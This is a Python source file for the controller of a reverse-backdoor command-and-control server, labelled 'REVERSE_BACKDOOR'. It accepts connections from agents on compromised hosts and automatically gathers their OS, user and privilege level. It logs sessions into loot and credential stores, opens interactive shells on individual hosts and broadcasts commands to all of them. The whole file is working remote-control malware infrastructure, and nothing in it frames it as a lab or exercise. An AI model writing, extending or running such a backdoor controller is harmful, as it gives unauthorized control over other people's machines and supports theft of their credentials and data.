from server.core.agent_registry import AgentRegistry
from server.core.audit import AuditLogger, LootManager, CredentialStore
from server.commands import build_server_router
from server.commands.base import ServerSessionContext
from server.ui.prompt import print_colored, highlight_output, bold, cyan, green, yellow, red, dim
from server.ui.completer import C2Completer, setup_readline, save_history
from server.ui.shell import AgentShell
import os


_audit_logger = None
_loot_manager = None
_credential_store = None


def _init_stores(loot_dir: str):
    global _audit_logger, _loot_manager, _credential_store
    if _audit_logger is None:
        _audit_logger = AuditLogger(loot_dir)
        _loot_manager = LootManager(loot_dir)
        _credential_store = CredentialStore(loot_dir)
    return _audit_logger, _loot_manager, _credential_store


def _build_protocol(sock, encryption):
    if encryption:
        from server.core.encrypted_protocol import EncryptedProtocol
        proto = EncryptedProtocol(sock)
        proto.perform_key_exchange()
        return proto
    from server.core.protocol import Protocol
    return Protocol(sock)


def _auto_recon(ctx, agent_id, registry, audit):
    try:
        ctx.protocol.send('sysinfo')
        result = str(ctx.protocol.recv())
        info = {}
        for line in result.split('\n'):
            line = line.strip()
            if ':' in line:
                key, val = line.split(':', 1)
                key, val = key.strip().lower(), val.strip()
                if 'operating system' in key:
                    info['os'] = val
                elif 'node name' in key:
                    info['hostname'] = val
                elif 'user' in key:
                    info['user'] = val

        ctx.protocol.send('check_admin')
        info['privilege'] = str(ctx.protocol.recv()).replace('[+] ', '').replace('[-] ', '')

        registry.update_info(agent_id, **info)
        agent_info = registry.get(agent_id)
        if agent_info:
            label = agent_info.label.replace(':', '_').replace('/', '_').replace('\\', '_')
            ctx.agent_label = label
            print_colored(
                f'[*] {agent_id} | {green(label)} | {cyan(info.get("os", "?"))} | {green(info.get("user", "?"))} | {yellow(info.get("privilege", "?"))}',
                'cyan'
            )
        audit.log(agent_id, 'sysinfo (auto-recon)', result[:200])
    except Exception:
        pass


def run_session(sock, ip, loot_dir, encryption=False):
    audit, loot, creds = _init_stores(loot_dir)
    protocol = _build_protocol(sock, encryption)
    registry = AgentRegistry()
    agent_id = registry.register(sock, ip)
    creds.log_session(agent_id, ip, connected=True)

    ctx = None
    router = build_server_router()

    try:
        ctx = ServerSessionContext(
            sock=sock,
            protocol=protocol,
            ip=ip,
            loot_dir=loot_dir,
            agent_id=agent_id,
        )
        _auto_recon(ctx, agent_id, registry, audit)

        commands = list(router._commands.keys())

        shell = AgentShell(router, ctx, agent_id, loot_dir, commands)
        shell.run()

    except (ConnectionError, BrokenPipeError, OSError):
        pass
    finally:
        registry.unregister(agent_id)
        creds.log_session(agent_id, ip, connected=False)
        print_colored(f'[*] {agent_id} ({ip}) disconnected', 'yellow')
        try:
            sock.close()
        except Exception:
            pass


def run_master_loop(loot_dir, encryption=False):
    registry = AgentRegistry()

    from server.ui.completer import build_master_completer
    comp = build_master_completer()
    history_dir = os.path.join(loot_dir, '.history')
    history_file = os.path.join(history_dir, 'master.history')
    setup_readline(comp, history_file)

    print_colored(f'[+] Type {cyan("agents")} to list, {cyan("interact <id>")} to connect, {cyan("broadcast <cmd>")} to spam', 'cyan')

    while True:
        try:
            command = input(f'{bold("REVERSE_BACKDOOR")}> ').strip()
        except (EOFError, KeyboardInterrupt):
            print_colored('\n[*] Shutting down...', 'yellow')
            break

        if not command:
            continue

        if command == 'exit' or command == 'quit':
            break

        if command == 'agents':
            agents = registry.list_all()
            if not agents:
                print(dim('  (no agents connected)'))
            else:
                from server.ui.prompt import format_table
                headers = ['ID', 'Host', 'OS', 'User', 'Privilege']
                rows = [[info.agent_id, info.hostname, info.os, info.user, info.privilege] for info in agents.values()]
                print(format_table(headers, rows))
            continue

        if command.startswith('interact '):
            target_id = command[9:].strip()
            info = registry.get(target_id)
            if info is None:
                print_colored(f'[-] Agent {target_id} not found', 'red')
                continue
            protocol = _build_protocol(info.sock, encryption)
            print_colored(f'[+] Interacting with {target_id} ({info.ip})', 'green')

            ctx = ServerSessionContext(
                sock=info.sock,
                protocol=protocol,
                ip=info.ip,
                loot_dir=loot_dir,
                agent_id=target_id,
            )
            router = build_server_router()
            commands = list(router._commands.keys())
            shell = AgentShell(router, ctx, target_id, loot_dir, commands)
            shell.run()
            continue

        if command.startswith('broadcast '):
            cmd = command[10:].strip()
            registry.broadcast(cmd)
            print_colored(f'[+] Broadcast sent: {cmd}', 'green')
            continue

        if command == 'help':
            print(f'''
  {bold('Master Commands:')}
    {cyan('agents')}                  List connected agents
    {cyan('interact <id>')}          Enter interactive shell with agent
    {cyan('broadcast <cmd>')}        Send command to all agents
    {cyan('listeners')}              Show active listeners
    {cyan('help')}                   Show this help
    {cyan('exit / quit')}            Shutdown server

  {bold('Prompts:')}
    {green('agent-1')}{green('@')}{magenta('10.0.0.5')} {cyan('root')} {dim('in')} {yellow('/var/www')}{bold('>')}
    {dim('│       │   │          │       │     └─ current directory')}
    {dim('│       │   │          │       └─ working directory')}
    {dim('│       │   │          └─ current user')}
    {dim('│       │   └─ remote IP')}
    {dim('│       └─ separator')}
    {dim('└─ agent identifier')}
''')
            continue

        if command == 'listeners':
            print_colored(f'[*] Active listener on port...', 'cyan')
            continue

        print_colored(f'[-] Unknown: {command}. Type help.', 'red')

    save_history(history_file)
